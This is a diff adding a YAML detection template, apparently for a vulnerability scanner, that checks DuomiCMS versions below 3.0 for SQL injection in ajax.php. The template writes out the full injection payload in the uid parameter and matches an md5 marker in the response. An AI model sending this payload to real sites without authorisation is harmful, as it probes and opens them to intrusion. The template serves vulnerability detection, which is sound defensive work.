@@ -1,0 +1,13 @@
+name: poc-yaml-duomicms-sqli
+rules:
+  - method: GET
+    path: >-
+      /duomiphp/ajax.php?action=addfav&id=1&uid=1%20and%20extractvalue(1,concat_ws(1,1,md5(2000000005)))
+    follow_redirects: false
+    expression: |
+      response.body.bcontains(b"fc9bdfb86bae5c322bae5acd78760935")
+detail:
+  author: hanxiansheng26(https://github.com/hanxiansheng26)
+  Affected Version: "duomicms<3.0"
+  links:
+    - https://xz.aliyun.com/t/2828
